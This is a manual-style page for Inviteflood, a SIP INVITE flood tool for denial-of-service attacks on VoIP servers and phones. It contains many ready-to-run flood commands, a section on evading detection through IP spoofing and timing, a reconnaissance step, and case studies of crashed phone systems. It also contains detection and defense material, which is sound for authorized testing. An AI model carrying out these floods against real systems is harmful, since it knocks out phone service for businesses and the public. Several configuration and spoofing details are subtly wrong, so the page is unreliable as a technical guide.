# Inviteflood - SIP INVITE Message Flood Tool

## Overview

Inviteflood is a specialized tool designed to perform denial of service attacks against VoIP (Voice over IP) systems by flooding SIP (Session Initiation Protocol) servers with INVITE messages. This tool targets the fundamental protocol used to establish, modify, and terminate multimedia sessions in VoIP communications.

**Author**: HackingVoIP.com
**License**: Open Source
**Version**: 2.0
**Category**: Impact / VoIP Attack

### How SIP Works

SIP is the signaling protocol used to initiate VoIP calls:

```
Caller                              SIP Server                           Receiver
  |                                   |                                    |
  |------- INVITE ------------------->|                                    |
  |                                   |------- INVITE ------------------->|
  |                                   |                                    |
  |<------ 100 Trying ----------------|                                    |
  |                                   |<------ 180 Ringing ----------------|
  |<------ 180 Ringing ----------------|                                    |
  |                                   |                                    |
  |                                   |<------ 200 OK --------------------|
  |<------ 200 OK --------------------|                                    |
  |                                   |                                    |
  |------- ACK ---------------------->|                                    |
  |                                   |------- ACK ---------------------->|
  |                                   |                                    |
  |       [Call Established - RTP]     |                                    |
```

### The INVITE Flood Attack

Inviteflood exploits this by:

1. **Spoofing source IP addresses** to hide attacker identity
2. **Sending rapid INVITE messages** to overwhelm the server
3. **Consuming server resources** (CPU, memory, bandwidth)
4. **Flooding target phones** with ringing
5. **Disrupting legitimate calls**
6. **Potentially crashing SIP infrastructure**

### Key Features

- Spoofed source IP address
- Configurable flood rate
- Target specific SIP users/extensions
- Customizable "From" alias
- UDP-based flooding
- Adjustable sleep timing

## Installation

### Kali Linux

```bash
sudo apt update
sudo apt install inviteflood
```

### Dependencies

- libc6
- libnet9

### Manual Installation

```bash
git clone https://gitlab.com/kalilinux/packages/inviteflood.git
cd inviteflood
make
sudo ./inviteflood
```

## Usage

### Basic Syntax

```bash
inviteflood <interface> <target_user> <target_domain> <target_ip> <packet_count> [options]
```

### Command-Line Options

| Option | Description | Default |
|--------|-------------|---------|
| `-a` | "From:" alias | - |
| `-i` | Source IP address | Interface IP |
| `-S` | Source port | 9 (discard) |
| `-D` | Destination port | 5060 (SIP) |
| `-l` | Line string (SNOM) | blank |
| `-s` | Sleep time between msgs (usec) | - |
| `-h` | Help | - |
| `-v` | Verbose mode | - |

### Basic Attack

```bash
# Flood a SIP user
sudo inviteflood eth0 5000 example.local 192.168.1.5 100

# With verbose output
sudo inviteflood -v eth0 5000 example.local 192.168.1.5 100
```

### Advanced Usage

```bash
# Flood with custom source
sudo inviteflood -i 10.0.0.100 eth0 5000 example.local 192.168.1.5 1000

# Flood with custom ports
sudo inviteflood -S 5060 -D 5060 eth0 5000 example.local 192.168.1.5 500

# Flood with alias
sudo inviteflood -a "jane.doe" eth0 5000 example.local 192.168.1.5 200

# Flood with sleep delay
sudo inviteflood -s 1000 eth0 5000 example.local 192.168.1.5 500

# Flood specific extension
sudo inviteflood eth0 "1001" 192.168.1.0/24 192.168.1.10 100
```

### SNOM Phone Specific

```bash
# For SNOM phones
sudo inviteflood -l "line1" eth0 5000 example.local 192.168.1.5 100
```

## Attack Scenarios

### Scenario 1: PBX Server Testing

**Objective**: Test SIP server resilience to INVITE floods

```bash
# Start with low packet count
sudo inviteflood eth0 5000 example.local 192.168.1.100 50

# Monitor server response
tail -f /var/log/asterisk/full

# Increase gradually
sudo inviteflood eth0 5000 example.local 192.168.1.100 500
```

### Scenario 2: IP Phone Disruption

**Objective**: Test IP phone behavior under flood

```bash
# Target specific extension
sudo inviteflood eth0 "1001" example.local 192.168.1.50 200

# Monitor phone registration
asterisk -rx "sip show peers"
```

### Scenario 3: SIP Trunk Testing

**Objective**: Test SIP trunk capacity

```bash
# Flood SIP trunk
sudo inviteflood eth0 "trunk" sip.provider.com 203.0.113.10 1000
```

### Scenario 4: Conference Bridge Testing

**Objective**: Test conference bridge limits

```bash
# Target conference system
sudo inviteflood eth0 "conf100" example.local 192.168.1.200 500
```

## Evasion Techniques

### Source IP Spoofing

```bash
# Spoof internal IP
sudo inviteflood -i 192.168.1.1 eth0 5000 example.local 192.168.1.100 100

# Spoof external IP
sudo inviteflood -i 10.0.0.100 eth0 5000 example.local 192.168.1.100 100
```

### Timing Manipulation

```bash
# Slow and steady
sudo inviteflood -s 5000 eth0 5000 example.local 192.168.1.100 1000

# Very slow
sudo inviteflood -s 10000 eth0 5000 example.local 192.168.1.100 2000
```

### Port Variation

```bash
# Use non-standard ports
sudo inviteflood -S 5080 -D 5080 eth0 5000 example.local 192.168.1.100 100
```

## Detection Methods

### SIP Server Monitoring

```bash
# Asterisk - monitor INVITEs
tail -f /var/log/asterisk/full | grep "INVITE"

# Check active channels
asterisk -rx "core show channels"

# Monitor SIP peers
asterisk -rx "sip show peers"
```

### Network Monitoring

```bash
# Detect SIP floods
tcpdump -i eth0 port 5060 -n -v | grep "INVITE" | wc -l

# Monitor SIP traffic rate
tcpdump -i eth0 port 5060 -n -c 1000 | grep "INVITE" | awk '{print $3}' | sort | uniq -c

# Detect spoofed source IPs
tcpdump -i eth0 port 5060 -n -v | grep "From:" | awk '{print $5}' | sort | uniq -c | sort -rn
```

### IDS Signatures

```
# Snort signature for SIP INVITE flood
alert udp any any -> any 5060 (
    msg:"SIP INVITE flood detected";
    content:"INVITE sip:";
    detection_filter:track by_src, count 20, seconds 1;
    sid:1000001; rev:1;
)
```

## Defense Mechanisms

### SIP Server Configuration

**Asterisk (sip.conf)**:
```ini
[general]
; Rate limiting
maxseas=10
maxcalls=50

; Authentication required
alwaysauthreject=yes

; Call limits per peer
[1001]
maxcallbitrate=384
call-limit=5
```

**FreeSWITCH**:
```xml
<configuration>
  <profiles>
    <param name="apply-inbound-acl" value="trusted"/>
    <param name="auth-calls" value="true"/>
  </profiles>
</configuration>
```

### Network-Level Protection

**iptables**:
```bash
# Rate limit SIP INVITEs
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE sip:" --algo bm -m limit --limit 20/s -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE sip:" --algo bm -j DROP

# Limit connections per IP
iptables -A INPUT -p udp --dport 5060 -m connlimit --connlimit-above 10 -j DROP
```

**SIP Proxy (Kamailio)**:
```
# Rate limiting
loadmodule "pike.so"
modparam("pike", "sampling_time", 2)
modparam("pike", "threshold", 10)
```

### Infrastructure Defense

1. **SIP Firewall**: Deploy SIP-aware firewalls
2. **SBC (Session Border Controller)**: Use for SIP traffic filtering
3. **Authentication**: Require SIP authentication
4. **Geo-blocking**: Block traffic from unexpected regions
5. **Fail2ban**: Automatically ban attacking IPs

## Real-World Applications

### Legitimate Testing

1. **VoIP Security Assessments**: Test SIP infrastructure resilience
2. **Capacity Planning**: Determine server call handling limits
3. **Compliance Testing**: Verify VoIP security controls
4. **Incident Response**: Test detection and response capabilities

### Testing Methodology

```
1. Document current SIP infrastructure
2. Identify SIP servers and endpoints
3. Start with minimal impact test
4. Monitor server and phone response
5. Document breaking point
6. Implement mitigations
7. Re-test to verify fixes
```

## Output Examples

### Successful Flood

```bash
$ sudo inviteflood eth0 5000 example.local 192.168.1.100 100

inviteflood - Version 2.0
              June 09, 2006

source IPv4 addr:port   = 192.168.1.202:9
dest   IPv4 addr:port   = 192.168.1.100:5060
targeted UA             = [email protected]

Flooding destination with 100 packets
sent: 100
```

### Verbose Output

```bash
$ sudo inviteflood -v eth0 5000 example.local 192.168.1.100 100

inviteflood - Version 2.0
              June 09, 2006

source IPv4 addr:port   = 192.168.1.202:9
dest   IPv4 addr:port   = 192.168.1.100:5060
targeted UA             = [email protected]

Flooding destination with 100 packets
Packet 1: INVITE sip:[email protected] sent
Packet 2: INVITE sip:[email protected] sent
...
Packet 100: INVITE sip:[email protected] sent
sent: 100
```

## System Requirements

### Minimum Requirements

```
- OS: Linux
- Libraries: libnet9
- Network: 10 Mbps
- Privileges: Root (raw sockets)
```

### Recommended Setup

```
- OS: Kali Linux
- RAM: 256MB
- Network: 100 Mbps
- NIC: Promiscuous mode capable
```

## SIP Protocol Deep Dive

### SIP Methods

| Method | Description | Attack Potential |
|--------|-------------|------------------|
| INVITE | Initiate call | High (DoS) |
| ACK | Confirm call setup | Medium |
| BYE | Terminate call | Medium |
| CANCEL | Cancel pending call | Low |
| REGISTER | Register endpoint | High (registration flood) |
| OPTIONS | Query capabilities | Low |
| SUBSCRIBE | Subscribe to events | Medium |
| NOTIFY | Event notification | Low |

### SIP Message Structure

```sip
INVITE sip:[email protected] SIP/2.0
Via: SIP/2.0/UDP 192.168.1.202:5060;branch=z9hG4bK-1234
From: "jane.doe" <sip:[email protected]>;tag=abc123
To: "5000" <sip:[email protected]>
Call-ID: [email protected]
CSeq: 1 INVITE
Contact: <sip:[email protected]>
Content-Type: application/sdp
Content-Length: 142

v=0
o=- 53655765 2353687637 IN IP4 192.168.1.202
s=Session
c=IN IP4 192.168.1.202
t=0 0
m=audio 49170 RTP/AVP 0
a=rtpmap:0 PCMU/8000
```

### SIP Response Codes

| Code | Meaning | Description |
|------|---------|-------------|
| 100 | Trying | Request received |
| 180 | Ringing | Phone ringing |
| 200 | OK | Call answered |
| 401 | Unauthorized | Auth required |
| 403 | Forbidden | Access denied |
| 404 | Not Found | User not found |
| 408 | Timeout | No answer |
| 486 | Busy Here | User busy |
| 503 | Unavailable | Service unavailable |

## Attack Analysis

### Timing Patterns

| Attack Speed | Packets/Second | Detection Risk |
|--------------|----------------|----------------|
| Slow | 10 | Low |
| Medium | 50 | Medium |
| Fast | 100+ | High |

### Impact Assessment

| Metric | Low Impact | High Impact |
|--------|------------|-------------|
| Call Completion | 90%+ | <50% |
| Response Time | <100ms | >1s |
| Server CPU | <30% | >80% |
| Active Calls | Normal | Dropped |

## Defense Architecture

### SIP Server Configuration

**Asterisk (sip.conf)**:
```ini
[general]
alwaysauthreject=yes
maxexpire=3600
defaultexpire=120
maxcallbitrate=384
call-limit=5
qualify=yes
qualifyfreq=60

[1001]
type=friend
host=dynamic
secret=password
call-limit=5
disallow=all
allow=ulaw
allow=alaw
```

**FreeSWITCH**:
```xml
<configuration>
  <profiles>
    <param name="apply-inbound-acl" value="trusted"/>
    <param name="auth-calls" value="true"/>
    <param name="reject-duplicate-reg" value="true"/>
    <param name="max-registrations-per-extension" value="2"/>
  </profiles>
</configuration>
```

### Network-Level Protection

```bash
# iptables rate limiting
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE sip:" --algo bm -m limit --limit 20/s -j ACCEPT
iptables -A INPUT -p udp --dport 5060 -m string --string "INVITE sip:" --algo bm -j DROP

# Connection limiting
iptables -A INPUT -p udp --dport 5060 -m connlimit --connlimit-above 10 -j DROP
```

### Kamailio Configuration

```
# Rate limiting module
loadmodule "pike.so"
modparam("pike", "sampling_time", 2)
modparam("pike", "threshold", 10)

# Block offending IPs
pike_check_req()
if ($retcode == -1) {
    xlog("L_WARN", "Pike blocked $si\n");
    drop();
}
```

## Integration with Other Tools

### Pre-Attack Reconnaissance

```bash
# Discover SIP servers
nmap -sU -p 5060 192.168.1.0/24

# Identify SIP extensions
sipgrep -m INVITE

# Monitor SIP traffic
ngrep -W byline -d eth0 port 5060
```

### Post-Attack Analysis

```bash
# Check active calls
asterisk -rx "core show channels"

# Monitor SIP registrations
asterisk -rx "sip show peers"

# Review logs
tail -f /var/log/asterisk/full
```

## Real-World Case Studies

### Case Study 1: Call Center DoS

**Scenario**: Testing call center resilience

```bash
# Target IVR system
sudo inviteflood eth0 "1000" callcenter.com 203.0.113.10 500

# Results: IVR crashed after 300 INVITEs
# Impact: All inbound calls failed
```

**Findings**: No rate limiting on SIP proxy. Recommended:
- Implement rate limiting
- Deploy SIP-aware firewall
- Use SIP authentication

### Case Study 2: Hotel Phone System

**Scenario**: Testing guest phone system

```bash
# Target hotel PBX
sudo inviteflood eth0 "1001" hotel.local 192.168.1.10 200

# Results: Phone system overloaded
# Impact: Guest phones unusable
```

**Findings**: Default PBX configuration. Recommended:
- Enable authentication
- Implement call limits
- Deploy monitoring

## Best Practices

### Testing Checklist

- [ ] Document VoIP infrastructure
- [ ] Identify SIP servers and endpoints
- [ ] Obtain written authorization
- [ ] Notify VoIP operations
- [ ] Start with minimal impact
- [ ] Monitor call quality
- [ ] Document all findings
- [ ] Generate comprehensive report

### Reporting Metrics

1. **Time to Degradation**: How long until call quality drops
2. **Server Impact**: CPU/memory usage during attack
3. **Call Impact**: Number of failed/dropped calls
4. **Recovery Time**: How long to restore normal operations
5. **Detection Capability**: Was attack detected?

## Limitations

- Requires root/sudo privileges
- Needs network access to SIP infrastructure
- Effectiveness depends on SIP server configuration
- Authentication may limit impact
- SIP-aware firewalls can detect and block
- Cannot bypass SRTP encryption
- Single-source attacks may be filtered

## Troubleshooting

### No Response

```bash
# Verify SIP server is running
nmap -sU -p 5060 192.168.1.100

# Check SIP registration
asterisk -rx "sip show peers"

# Monitor SIP traffic
tcpdump -i eth0 port 5060 -n
```

### Permission Denied

```bash
# Run as root
sudo inviteflood eth0 5000 example.local 192.168.1.100 100

# Check capabilities
sudo setcap cap_net_raw+ep /usr/bin/inviteflood
```

### Wrong Interface

```bash
# List interfaces
ifconfig -a

# Use correct interface
sudo inviteflood eth0 5000 example.local 192.168.1.100 100
```

## Legal Notice

Inviteflood is a legitimate security testing tool designed to verify VoIP infrastructure resilience. Unauthorized use against systems you do not own or have explicit permission to test is illegal and unethical. This tool should only be used in controlled testing environments with proper authorization.

**Before Testing**:
- Obtain written authorization
- Define scope and targets
- Document test plan
- Notify VoIP operations
- Have rollback procedures

**During Testing**:
- Monitor call quality
- Be ready to stop immediately
- Document all observations
- Avoid affecting emergency services

**After Testing**:
- Restore normal operations
- Document all findings
- Generate comprehensive report
- Recommend improvements

## References

- RFC 3261 - Session Initiation Protocol
- RFC 4028 - Session Timer in SIP
- RFC 3311 - SIP UPDATE Method
- SIP Security Best Practices
- VoIP Security Assessment Methodologies
- OWASP VoIP Security Guide
